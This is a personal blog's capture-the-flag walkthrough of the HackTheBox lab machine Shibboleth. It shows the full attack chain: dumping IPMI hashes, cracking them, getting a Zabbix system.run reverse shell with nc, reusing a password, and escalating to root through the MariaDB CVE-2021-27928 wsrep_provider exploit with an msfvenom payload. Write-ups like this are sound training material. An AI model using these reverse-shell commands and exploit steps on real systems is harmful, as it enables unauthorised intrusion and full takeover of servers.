@@ -1,0 +1,514 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Shibboleth Writeup / Walkthrough Hack the box</title>
+
+  <link rel="icon" type="image/png" href="/assets/images/logo.png?v=96ad5fd1fb">
+  <link rel="apple-touch-icon" href="/assets/images/logo.png?v=96ad5fd1fb">
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;700&family=Space+Grotesk:wght@400;500;700&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+  <link rel="stylesheet" href="/assets/css/style.css?v=96ad5fd1fb">
+
+  <meta name="description" content="Writeup on Shibboleth (Linux HackTheBox) | Initial foothold was through Zabbix code execution | Privesc was by exploiting vulnerable database">
+    <link rel="canonical" href="https://sheerazali.com/blog/shibboleth-writeup-walkthrough-hack-the-box/">
+    <meta name="referrer" content="no-referrer-when-downgrade">
+    
+    <meta property="og:site_name" content="Sheeraz Ali">
+    <meta property="og:type" content="article">
+    <meta property="og:title" content="Shibboleth Writeup / Walkthrough Hack the box">
+    <meta property="og:description" content="Writeup on Shibboleth (Linux HackTheBox) | Initial foothold was through Zabbix code execution | Privesc was by exploiting vulnerable database">
+    <meta property="og:url" content="https://sheerazali.com/blog/shibboleth-writeup-walkthrough-hack-the-box/">
+    <meta property="og:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2022/02/shibboleht.jpg?fit&#x3D;785%2C507&amp;ssl&#x3D;1">
+    <meta property="article:published_time" content="2022-02-10T14:20:12.000Z">
+    <meta property="article:modified_time" content="2022-04-14T02:21:27.000Z">
+    <meta property="article:tag" content="HackTheBox">
+    <meta property="article:tag" content="Writeup">
+    
+    <meta property="article:publisher" content="https://www.facebook.com/ghost">
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:title" content="Shibboleth Writeup / Walkthrough Hack the box">
+    <meta name="twitter:description" content="Writeup on Shibboleth (Linux HackTheBox) | Initial foothold was through Zabbix code execution | Privesc was by exploiting vulnerable database">
+    <meta name="twitter:url" content="https://sheerazali.com/blog/shibboleth-writeup-walkthrough-hack-the-box/">
+    <meta name="twitter:image" content="https://i0.wp.com/sheerazali.com/wp-content/uploads/2022/02/shibboleht.jpg?fit&#x3D;785%2C507&amp;ssl&#x3D;1">
+    <meta name="twitter:label1" content="Written by">
+    <meta name="twitter:data1" content="sheeraz ali">
+    <meta name="twitter:label2" content="Filed under">
+    <meta name="twitter:data2" content="HackTheBox, Writeup">
+    <meta name="twitter:site" content="@beingsheerazali">
+    <meta property="og:image:width" content="785">
+    <meta property="og:image:height" content="507">
+    
+    <script type="application/ld+json">
+{
+    "@context": "https://schema.org",
+    "@type": "Article",
+    "publisher": {
+        "@type": "Organization",
+        "name": "Sheeraz Ali",
+        "url": "https://sheerazali.com/",
+        "logo": {
+            "@type": "ImageObject",
+            "url": "https://sheerazali.com/favicon.ico"
+        }
+    },
+    "author": {
+        "@type": "Person",
+        "name": "sheeraz ali",
+        "image": {
+            "@type": "ImageObject",
+            "url": "https://www.gravatar.com/avatar/b78e4b3b7f8de6d5dafee8306d76ace7?s=250&r=x&d=mp",
+            "width": 250,
+            "height": 250
+        },
+        "url": "https://sheerazali.com/author/sheeraz/",
+        "sameAs": []
+    },
+    "headline": "Shibboleth Writeup / Walkthrough Hack the box",
+    "url": "https://sheerazali.com/blog/shibboleth-writeup-walkthrough-hack-the-box/",
+    "datePublished": "2022-02-10T14:20:12.000Z",
+    "dateModified": "2022-04-14T02:21:27.000Z",
+    "image": {
+        "@type": "ImageObject",
+        "url": "https://i0.wp.com/sheerazali.com/wp-content/uploads/2022/02/shibboleht.jpg?fit=785%2C507&ssl=1",
+        "width": 785,
+        "height": 507
+    },
+    "keywords": "HackTheBox, Writeup",
+    "description": "Writeup on Shibboleth (Linux HackTheBox) | Initial foothold was through Zabbix code execution | Privesc was by exploiting vulnerable database",
+    "mainEntityOfPage": "https://sheerazali.com/blog/shibboleth-writeup-walkthrough-hack-the-box/"
+}
+    </script>
+
+    <meta name="generator" content="Ghost 5.130">
+    <link rel="alternate" type="application/rss+xml" title="Sheeraz Ali" href="https://sheerazali.com/rss/">
+    <script defer src="https://cdn.jsdelivr.net/ghost/portal@~2.51/umd/portal.min.js" data-i18n="true" data-ghost="https://sheerazali.com/" data-key="15f06e61ecb8d951198e7015b6" data-api="https://sheerazali.com/ghost/api/content/" data-locale="en" crossorigin="anonymous"></script><style id="gh-members-styles">.gh-post-upgrade-cta-content,
+.gh-post-upgrade-cta {
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Oxygen, Ubuntu, Cantarell, 'Open Sans', 'Helvetica Neue', sans-serif;
+    text-align: center;
+    width: 100%;
+    color: #ffffff;
+    font-size: 16px;
+}
+
+.gh-post-upgrade-cta-content {
+    border-radius: 8px;
+    padding: 40px 4vw;
+}
+
+.gh-post-upgrade-cta h2 {
+    color: #ffffff;
+    font-size: 28px;
+    letter-spacing: -0.2px;
+    margin: 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta p {
+    margin: 20px 0 0;
+    padding: 0;
+}
+
+.gh-post-upgrade-cta small {
+    font-size: 16px;
+    letter-spacing: -0.2px;
+}
+
+.gh-post-upgrade-cta a {
+    color: #ffffff;
+    cursor: pointer;
+    font-weight: 500;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a:hover {
+    color: #ffffff;
+    opacity: 0.8;
+    box-shadow: none;
+    text-decoration: underline;
+}
+
+.gh-post-upgrade-cta a.gh-btn {
+    display: block;
+    background: #ffffff;
+    text-decoration: none;
+    margin: 28px 0 0;
+    padding: 8px 18px;
+    border-radius: 4px;
+    font-size: 16px;
+    font-weight: 600;
+}
+
+.gh-post-upgrade-cta a.gh-btn:hover {
+    opacity: 0.92;
+}</style>
+    <script defer src="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/sodo-search.min.js" data-key="15f06e61ecb8d951198e7015b6" data-styles="https://cdn.jsdelivr.net/ghost/sodo-search@~1.8/umd/main.css" data-sodo-search="https://sheerazali.com/" data-locale="en" crossorigin="anonymous"></script>
+    
+    <link href="https://sheerazali.com/webmentions/receive/" rel="webmention">
+    <script defer src="/public/cards.min.js?v=96ad5fd1fb"></script>
+    <link rel="stylesheet" type="text/css" href="/public/cards.min.css?v=96ad5fd1fb">
+    <script defer src="/public/member-attribution.min.js?v=96ad5fd1fb"></script><style>:root {--ghost-accent-color: #FF1A75;}</style>
+</head>
+<body class="post-template tag-hackthebox tag-writeup tag-hash-import-2026-01-05-15-55">
+
+<div class="terminal-wrapper">
+
+  <header class="site-header">
+  <div class="container">
+    <div class="header-content">
+
+      <a href="https://sheerazali.com/" class="site-logo">
+        <img src="/assets/images/logo.png" alt="Sheeraz Ali">
+      </a>
+
+      <nav class="main-nav">
+        <ul>
+          <li><a href="https://sheerazali.com/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>home<span class="bracket">]</span></a></li>
+          <li><a href="/blog/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>blog<span class="bracket">]</span></a></li>
+          <li><a href="/timeline/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>timeline<span class="bracket">]</span></a></li>
+          <li><a href="/resume/" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>resume<span class="bracket">]</span></a></li>
+          <li><a href="https://www.codevigilant.com/author/syed_sheeraz_ali/" target="_blank" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>cves<span class="bracket">]</span></a></li>
+          <li><a href="https://sheerazali.com/#contact" class="nav-link"><span class="bracket">[</span><span class="prefix">./</span>contact<span class="bracket">]</span></a></li>
+        </ul>
+      </nav>
+
+      <div class="header-status">
+        <span class="status-indicator">
+          <span class="status-dot"></span>
+          <span class="status-text">Online</span>
+        </span>
+      </div>
+
+    </div>
+  </div>
+</header>
+
+  <main class="main-content">
+    
+<article class="single-post">
+  <div class="container">
+
+    <header class="post-header">
+      <div class="post-meta-top">
+        <a href="https://sheerazali.com/tag/hackthebox/" class="post-category">HackTheBox</a>
+        <span class="post-date">February 10, 2022</span>
+        <span class="reading-time">10 min read</span>
+      </div>
+
+      <h1 class="post-title glitch" data-text="Shibboleth Writeup / Walkthrough Hack the box">Shibboleth Writeup / Walkthrough Hack the box</h1>
+
+      <div class="post-author">
+        <span class="author-label">Author:</span>
+        <a href="https://sheerazali.com/author/sheeraz/">sheeraz ali</a>
+      </div>
+    </header>
+
+    <div class="featured-image">
+      <img src="https://i0.wp.com/sheerazali.com/wp-content/uploads/2022/02/shibboleht.jpg?fit&#x3D;785%2C507&amp;ssl&#x3D;1" alt="Shibboleth Writeup / Walkthrough Hack the box">
+    </div>
+
+    <div class="post-body">
+      <div class="content-wrapper">
+        <div class="terminal-window">
+          <div class="terminal-header">
+            <span class="terminal-dot red"></span>
+            <span class="terminal-dot yellow"></span>
+            <span class="terminal-dot green"></span>
+            <span class="terminal-title">Shibboleth Writeup / Walkthrough Hack the box</span>
+          </div>
+          <div class="terminal-content">
+            <h1 id="tldr">TL;DR</h1><p><br>This is a walkthrough writeup on Shibboleth which is a Linux box categorized as medium difficulty on HackTheBox.The initial foothold was gained by dumping the IPMI password hashes through the <code>asf-rmcp</code> service running on UDP port <code>623</code> &amp; leveraging these credentials to get code execution through the Zabbix server dashboard. Lateral privesc was made possible through password reuse. Privilege escalation to <code>root</code> user was gained by exploiting an <code>eval</code> injection vulnerability in the MariabDB database version that was being used on the box.</p><h1 id="walkthrough">Walkthrough</h1><h2 id="shibboleth-writeup-scanning-network">Shibboleth Writeup: Scanning Network</h2><p>Scanning ports with Nmap :</p><pre><code class="language-markdown">Command : nmap -p 80 -sC -sV -A -n -Pn -oN nmap.initial 10.10.11.124
+Nmap scan report for 10.10.11.124
+Host is up (0.26s latency).
+
+PORT   STATE SERVICE VERSION
+80/tcp open  http    Apache httpd 2.4.41
+|_http-title: Did not follow redirect to http://shibboleth.htb/
+</code></pre><p>We see an Apache Web Server running on TCP <code>port 80</code></p><p>Scanning the UDP ports :</p><pre><code class="language-markdown">Command : nmap -sU --min-rate 1000 -n -Pn $IP
+Nmap scan report for 10.10.11.124
+Host is up (0.26s latency).
+Not shown: 989 open|filtered udp ports (no-response)
+PORT      STATE  SERVICE
+137/udp   closed netbios-ns
+623/udp   open   asf-rmcp
+1022/udp  closed exp2
+1038/udp  closed mtqp
+18485/udp closed unknown
+19933/udp closed unknown
+22053/udp closed unknown
+22986/udp closed unknown
+32815/udp closed unknown
+49154/udp closed unknown
+58797/udp closed unknown
+</code></pre><p>We have UDP <code>port 623</code> open, running a service <code>asf-rmcp</code>.</p><h2 id="website-enumeration">Website Enumeration</h2><p>On browsing the IP address, we were being redirected to <code>shibboleth.htb</code> indicating that the server is using virtual host routing. Thus, let us add an appropriate entry in the <code>/etc/hosts</code> file :</p><pre><code class="language-markdown">10.10.11.124	shibboleth.htb</code></pre><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_02_image.png" class="kg-image" alt loading="lazy" width="770" height="340"></figure><p>I saw that the “Contact Us form” was throwing an error (seemed probably because a certain required library was not installed):</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_02_image-6.png" class="kg-image" alt loading="lazy" width="528" height="406"></figure><p>Found nothing worth use on this website. Moving ahead with sub-directory enumeration.</p><h2 id="dirbuster-scan">Dirbuster Scan</h2><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_02_image-2.png" class="kg-image" alt loading="lazy" width="770" height="289"></figure><h3 id="forms"><code>/forms/</code></h3><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_02_image-3.png" class="kg-image" alt loading="lazy" width="590" height="332"></figure><h4 id="readmetxt"><code>Readme.txt</code></h4><p>This was just a Bootstrap information file :</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_02_image-4.png" class="kg-image" alt loading="lazy" width="659" height="95"></figure><h4 id="contactphp"><code>contact.php</code></h4><p>This had the same error message which we encountered  earlier :</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_02_image-5.png" class="kg-image" alt loading="lazy" width="713" height="111"></figure><h2 id="sub-domain-enumeration">Sub-Domain Enumeration</h2><p>We will be using the <code>wfuzz</code> tool, and also include the <code>-H</code> flag to add a <code>Host</code> header because the server is using virtual host routing :</p><pre><code class="language-bash">┌──(root💀kali)-[~/Desktop/Boxes/HTB/Shibboleth]
+└─# wfuzz -H "Host: FUZZ.shibboleth.htb" --hl 9 -c -w /usr/share/wordlists/secLists/subdomains-top1million-5000.txt $IP
+ /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
+********************************************************
+* Wfuzz 3.1.0 - The Web Fuzzer                         *
+********************************************************
+
+Target: http://10.10.11.124/
+Total requests: 4989
+
+=====================================================================
+ID           Response   Lines    Word       Chars       Payload                                                                                                                    
+=====================================================================
+
+000000099:   200        29 L     219 W      3684 Ch     "monitor"                                                                                                                  
+000000346:   200        29 L     219 W      3684 Ch     "monitoring"                                                                                                               
+000000390:   200        29 L     219 W      3684 Ch     "zabbix"                                                                                                                   
+
+Total time: 0
+Processed Requests: 4989
+Filtered Requests: 4986
+Requests/sec.: 0</code></pre><p>We found 3 sub-domains, so let’s add them to the <code>/etc/hosts</code> file.</p><pre><code class="language-markdown">10.10.11.124	shibboleth.htb monitor.shibboleth.htb monitoring.shibboleth.htb zabbix.shibboleth.htb</code></pre><p>Well, on browsing, all the three sub-domains lead to the same page –&gt; Zabbix login page</p><p>What is Zabbix ? Zabbix is an open-source monitoring software tool for diverse IT components, including networks, servers, virtual machines and cloud services. Zabbix provides monitoring metrics, among others network utilization, CPU load and disk space consumption.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_02_image-7.png" class="kg-image" alt loading="lazy" width="770" height="449"></figure><p>I tried a bunch of default credentials here, but none of them worked.</p><p>I was kinda hitting a wall here, but wait, remember that UDP port we found? Let’s enumerate that 🙂</p><h3 id="enumerating-port-623-running-asf-rmcp">Enumerating <code>port 623</code> running <code>asf-rmcp</code></h3><p>What is asf-rmcp ? ASF is a DMTF standard that provides a remote control and alerting interface between management consoles and ASF-aware hosts. RMCP is a network protocol used by a management console to remotely control an ASF-aware host. This makes sense, because the host is running Zabbix, which is a monitoring software tool.</p><h4 id="dumping-ipmi-hashes">Dumping IPMI hashes</h4><p>On googling, I stumbled upon this blog <a href="//book.hacktricks.xyz/pentesting/623-udp-ipmi" rel="noreferrer noopener">623/UDP/TCP – IPMI – HackTricks</a></p><p>It has a section talking about “dumping IPMI hashes” using a Metasploit module, going ahead with this :</p><pre><code class="language-bash">msf6 auxiliary(scanner/ipmi/ipmi_version) &gt; use auxiliary/scanner/ipmi/ipmi_dumphashes
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; options
+
+Module options (auxiliary/scanner/ipmi/ipmi_dumphashes):
+
+   Name                  Current Setting                                            Required  Description
+   ----                  ---------------                                            --------  -----------
+   CRACK_COMMON          true                                                       yes       Automatically crack common passwords as they are obtained
+   OUTPUT_HASHCAT_FILE                                                              no        Save captured password hashes in hashcat format
+   OUTPUT_JOHN_FILE                                                                 no        Save captured password hashes in john the ripper format
+   PASS_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_passw  yes       File containing common passwords for offline cracking, one per line
+                         ords.txt
+   RHOSTS                                                                           yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
+   RPORT                 623                                                        yes       The target port
+   SESSION_MAX_ATTEMPTS  5                                                          yes       Maximum number of session retries, required on certain BMCs (HP iLO 4, etc)
+   SESSION_RETRY_DELAY   5                                                          yes       Delay between session retries in seconds
+   THREADS               1                                                          yes       The number of concurrent threads (max one per host)
+   USER_FILE             /usr/share/metasploit-framework/data/wordlists/ipmi_users  yes       File containing usernames, one per line
+                         .txt
+
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; set RHOSTS 10.10.11.124
+RHOSTS =&gt; 10.10.11.124
+msf6 auxiliary(scanner/ipmi/ipmi_dumphashes) &gt; run
+
+[+] 10.10.11.124:623 - IPMI - Hash found: Administrator:4458aac582020000479fa54d6008d9318aaf7129bfdcd2cc4ad4221b7e41c0f40c59e380513da442a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1af2e66206082e7b78a920cc983f862daab424ae
+[*] Scanned 1 of 1 hosts (100% complete)
+[*] Auxiliary module execution completed</code></pre><p>We did obtain a password hash for the user <em>Administrator</em> :</p><pre><code class="language-markdown">Administrator:4458aac582020000479fa54d6008d9318aaf7129bfdcd2cc4ad4221b7e41c0f40c59e380513da442a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1af2e66206082e7b78a920cc983f862daab424ae
+</code></pre><hr><hr><h3 id="cracking-the-obtained-hash-using-hashcat">Cracking the obtained hash using <code>hashcat</code></h3><pre><code class="language-markdown">We checked the manual page for hashcat and saw that mode 7300 --&gt; IPMI2 RAKP HMAC-SHA1.
+
+hashcat.exe -m 7300 -a 0 -o ./wordlists/cracked.txt ./wordlists/hash.txt ./wordlists/rockyou.txt</code></pre><pre><code class="language-markdown">4458aac582020000479fa54d6008d9318aaf7129bfdcd2cc4ad4221b7e41c0f40c59e380513da442a123456789abcdefa123456789abcdef140d41646d696e6973747261746f72:1af2e66206082e7b78a920cc983f862daab424ae
+
+ilovepumkinpie1</code></pre><hr><h3 id="shibboleth-writeup-zabbix-dashboard-logging-in-with-obtained-creds">Shibboleth Writeup: Zabbix Dashboard (logging in with obtained creds)</h3><pre><code class="language-markdown">user : Administrator
+pass : ilovepumkinpie1</code></pre><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_02_image-8.png" class="kg-image" alt loading="lazy" width="770" height="387"><figcaption>Zabbix Dashboard</figcaption></figure><h2 id="shibboleth-writeup-shell-as-zabbix">Shibboleth Writeup: Shell as <code>zabbix</code></h2><p>Now, the next challenge to somehow get code execution through the access we got on Zabbix. On googling around, I found this old video by our teacher, Ippsec –&gt; <a href="//www.youtube.com/watch?v=RLvFwiDK_F8">HackTheBox – Zipper – YouTube</a> , in which he talks about how we can get authenticated code execution on Zabbix :</p><p>Going to the “Configuration –&gt; Hosts” section, and choose the host on which you are concerned about, <code>shibboleth.htb</code> in our case :</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_02_image-9.png" class="kg-image" alt="Shibboleth Writeup" loading="lazy" width="770" height="296"></figure><p>Going to the “Items” section, and on the top right goto “Create Item” :</p><p>What is item in Zabbix ? Items are the ones that gather data from a host. Once you have configured a host, you need to add some monitoring items to start getting actual data.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_02_image-10.png" class="kg-image" alt="Shibboleth Writeup" loading="lazy" width="770" height="322"></figure><p>We will fill up the fields, including the “<em>Key</em>” field with the reverse shell command by choosing ‘<strong><em>system.run</em>‘ </strong>option from the drop-down list.</p><figure class="kg-card kg-image-card kg-card-hascaption"><img src="/assets/images/blog/2022_02_image-14.png" class="kg-image" alt loading="lazy" width="770" height="217"><figcaption>more info on system.run</figcaption></figure><p><code>system.run</code> key needs two arguments <strong><code>command</code></strong> and <strong><code>mode</code></strong>. We will give the reverse shell command as the first argument (command), and for <code>mode</code> parameter, we will use, <em><code>nowait</code></em>, because we want the reverse shell command to execute without wait.</p><p>Here is the complete command :</p><pre><code class="language-markdown">system.run[rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.11 1234 &gt;/tmp/f,nowait]</code></pre><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_02_image-11.png" class="kg-image" alt="Shibboleth Writeup" loading="lazy" width="770" height="568"></figure><p>Hit the “Test” option and then, click on “Get Value” to run the command &amp; obtain a reverse shell.</p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_02_image-12.png" class="kg-image" alt="Shibboleth Writeup" loading="lazy" width="770" height="327"></figure><p>Obtaining a reverse shell as user <code>zabbix</code> on our listening port :</p><pre><code class="language-bash">┌──(root💀kali)-[~/Desktop/Boxes/HTB/Shibboleth]
+└─# nc -nvlp 1337
+listening on [any] 1337 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.11.124] 32832
+/bin/sh: 0: can't access tty; job control turned off
+$ id
+uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)
+$ which python3
+/usr/bin/python3
+$ python3 -c "import pty;pty.spawn('/bin/bash')"
+
+zabbix@shibboleth:/$ id
+uid=110(zabbix) gid=118(zabbix) groups=118(zabbix)</code></pre><hr><h2 id="shibboleth-writeup-user-flag-%E2%9B%B3">Shibboleth Writeup: User Flag ⛳</h2><h3 id="shell-as-ipmi-svc">Shell as <code>ipmi-svc</code></h3><p>We enumerated the file system and found out another user <code>impi-svc</code>. Using the password we found for Zabbix, we were able to switch to user <code>ipmi-svc</code> (password reuse) :</p><pre><code class="language-bash">zabbix@shibboleth:/var/www/html$ su ipmi-svc
+Password: 
+ipmi-svc@shibboleth:/var/www/html$
+
+ipmi-svc@shibboleth:~$ cat user.txt 
+540b1***************************</code></pre><hr><h2 id="privilege-escalation">Privilege Escalation</h2><p>On further enumerating the file system, I found a <code>config</code> file for the Zabbix server, which revealed the database credentials :</p><pre><code class="language-bash">FILE : /etc/zabbix/zabbix_server.conf
+
+ipmi-svc@shibboleth:~$ cat /etc/zabbix/zabbix_server.conf | grep -v \^\# | grep -v '^$'
+
+LogFile=/var/log/zabbix/zabbix_server.log
+LogFileSize=0
+PidFile=/run/zabbix/zabbix_server.pid
+SocketDir=/run/zabbix
+
+DBName=zabbix
+DBUser=zabbix
+DBPassword=bloooarskybluh
+
+SNMPTrapperFile=/var/log/snmptrap/snmptrap.log
+Timeout=4
+AlertScriptsPath=/usr/lib/zabbix/alertscripts
+ExternalScripts=/usr/lib/zabbix/externalscripts
+FpingLocation=/usr/bin/fping
+Fping6Location=/usr/bin/fping6
+LogSlowQueries=3000
+StatsAllowedIP=127.0.0.1</code></pre><pre><code class="language-markdown">DBName=zabbix
+DBUser=zabbix
+DBPassword=bloooarskybluh</code></pre><p>I immediately tried to connect to the <code>MySQL</code> database using the above creds &amp; found some password hashes for the users of Zabbix</p><pre><code class="language-bash">ipmi-svc@shibboleth:~$ mysql -D zabbix -u zabbix -p
+Enter password: 
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 3876
+Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+MariaDB [zabbix]&gt; show databases;
++--------------------+
+| Database           |
++--------------------+
+| information_schema |
+| zabbix             |
++--------------------+
+2 rows in set (0.001 sec)
+
+MariaDB [zabbix]&gt; use zabbix;
+Database changed
+
+MariaDB [zabbix]&gt; show tables;
++----------------------------+
+| Tables_in_zabbix           |
++----------------------------+
+    ********SNIP*******
+| users                      |
+    *******SNIP*********
+
+MariaDB [zabbix]&gt; select userid,alias,name,surname,passwd from users;
++--------+---------------+--------------+---------------+--------------------------------------------------------------+
+| userid | alias         | name         | surname       | passwd                                                       |
++--------+---------------+--------------+---------------+--------------------------------------------------------------+
+|      1 | Admin         | Zabbix       | Administrator | $2y$10$L9tjKByfruByB.BaTQJz/epcbDQta4uRM/KySxSZTwZkMGuKTPPT2 |
+|      2 | guest         |              |               | $2y$10$89otZrRNmde97rIyzclecuk6LwKAsHN0BcvoOKGjbT.BwMBfm7G06 |
+|      3 | Administrator | IPMI Service | Account       | $2y$10$FhkN5OCLQjs3d6C.KtQgdeCc485jKBWPW4igFVEgtIP3jneaN7GQe |
++--------+---------------+--------------+---------------+--------------------------------------------------------------+
+3 rows in set (0.000 sec)</code></pre><p>Although, we already had the password for the Admin user of Zabbix console but the database seemingly has 2 different Admin accounts and password hashes.</p><p>I tried to crack the hash for the Admin users but its a <code><strong>bcrypt</strong></code> hash, and was taking a hell lot of time. I did run hashcat for a while on it, but soon realized that this wasn’t the intended pathway for rooting this box.</p><p>After enumerating a lot, I was almost hitting a wall, but then I went on to check exploits for the services running on the box. And fortunately enough, I found something potentially exploitable.</p><h3 id="vulnerable-db-version">Vulnerable DB version</h3><p>The DB version is displayed to us when we log in to the database :</p><pre><code class="language-markdown">Server version: 10.3.25-MariaDB-0ubuntu0.20.04.1 Ubuntu 20.04</code></pre><p>Searching for exploits for this version :</p><pre><code class="language-bash">┌──(root💀kali)-[~/Desktop/Boxes/HTB/Shibboleth]
+└─# searchsploit mariadb 10
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+ Exploit Title                                                                                                                                            |  Path
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+MariaDB 10.2 - 'wsrep_provider' OS Command Execution                                                                                                      | linux/local/49765.txt
+MariaDB Client 10.1.26 - Denial of Service (PoC)                                                                                                          | linux/dos/45901.txt
+---------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
+Shellcodes: No Results
+Papers: No Results</code></pre><p>On googling around, I found that the <code>MariaDB version 10.3.25</code> is vulnerable to <code>CVE-2021-27928</code> :</p><p><a href="//packetstormsecurity.com/files/162177/MariaDB-10.2-Command-Execution.html">MariaDB 10.2 Command Execution ≈ Packet Storm (packetstormsecurity.com)</a></p><figure class="kg-card kg-image-card"><img src="/assets/images/blog/2022_02_image-13.png" class="kg-image" alt="Shibboleth Writeup" loading="lazy" width="770" height="374"></figure><p>Exploit : An untrusted search path leads to eval injection, in which a database SUPER user can execute OS commands after modifying 'wsrep_provider' and 'wsrep_notify_cmd'. Can read more about the vulnerability <a href="//jira.mariadb.org/browse/MDEV-25179" rel="noreferrer noopener">here</a>.</p><pre><code class="language-bash"># Exploit Title: MariaDB 10.2 /MySQL - 'wsrep_provider' OS Command Execution
+# Date: 03/18/2021
+# Exploit Author: Central InfoSec
+# Version: MariaDB 10.2 before 10.2.37, 10.3 before 10.3.28, 10.4 before 10.4.18, and 10.5 before 10.5.9; Percona Server through 2021-03-03; and the wsrep patch through 2021-03-03 for MySQL
+# Tested on: Linux
+# CVE : CVE-2021-27928
+
+# Proof of Concept:
+
+# Create the reverse shell payload
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=&lt;ip&gt; LPORT=&lt;port&gt; -f elf-so -o CVE-2021-27928.so
+
+# Start a listener
+nc -lvp &lt;port&gt;
+
+# Copy the payload to the target machine (In this example, SCP/SSH is used)
+scp CVE-2021-27928.so &lt;user&gt;@&lt;ip&gt;:/tmp/CVE-2021-27928.so
+
+# Execute the payload
+mysql -u &lt;user&gt; -p -h &lt;ip&gt; -e 'SET GLOBAL wsrep_provider="/tmp/CVE-2021-27928.so";'</code></pre><p>Following the exploit instructions  –&gt;</p><h2 id="exploit">Exploit</h2><p>Creating a reverse shell payload using <code>msfvenom</code> :</p><pre><code class="language-bash">┌──(root💀kali)-[~/Desktop/Boxes/HTB/Shibboleth]
+└─# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=6969 -f elf-so -o reverse.so
+[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
+[-] No arch selected, selecting arch: x64 from the payload
+No encoder specified, outputting raw payload
+Payload size: 74 bytes
+Final size of elf-so file: 476 bytes
+Saved as: reverse.so</code></pre><p>Transferred it to the box by serving it on a Python server.</p><p>And setting the variable <code>wsrep_provider</code> with the value of the ‘path to the payload’, gives us a reverse shell as user <code>root</code> :</p><pre><code class="language-bash">MariaDB [zabbix]&gt; SET GLOBAL wsrep_provider="/home/ipmi-svc/reverse.so";
+ERROR 2013 (HY000): Lost connection to MySQL server during query
+
+MariaDB [zabbix]&gt; </code></pre><h2 id="shibboleth-writeup-root-flag-%E2%9B%B3">Shibboleth Writeup: Root Flag ⛳</h2><pre><code class="language-bash">┌──(root💀kali)-[~/Desktop/Boxes/HTB/Shibboleth]
+└─# nc -nvlp 6969
+listening on [any] 6969 ...
+connect to [10.10.14.11] from (UNKNOWN) [10.10.11.124] 51714
+id
+uid=0(root) gid=0(root) groups=0(root)
+pyhton3 -c "import pty;pty.spawn('/bin/bash')"
+/bin/sh: 2: pyhton3: not found
+python3 -c "import pty;pty.spawn('/bin/bash')"
+root@shibboleth:/var/lib/mysql# id
+id
+uid=0(root) gid=0(root) groups=0(root)
+root@shibboleth:/var/lib/mysql# cat /root/root.txt
+cat /root/root.txt
+7615e***************************</code></pre><hr><p>Kudos for rooting Shibboleth. Until next time, keep hacking and do checkout other writeups and blogs on <a href="https://sheerazali.com/">sheerazali.com</a></p>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <div class="post-tags">
+      <span class="tags-label">Tags:</span>
+      <a href="/tag/hackthebox/" class="tag">HackTheBox</a>
+      <a href="/tag/writeup/" class="tag">Writeup</a>
+    </div>
+
+  </div>
+</article>
+
+  <section class="related-posts">
+    <div class="container">
+      <h3 class="section-title"><span class="prefix">./</span>related_writeups</h3>
+      <div class="related-grid">
+        <a href="/blog/raining-cves-on-wordpress-plugins-using-semgrep-slide-deck/" class="related-card">
+          <div class="card-corner tl"></div>
+          <div class="card-corner tr"></div>
+          <div class="card-corner bl"></div>
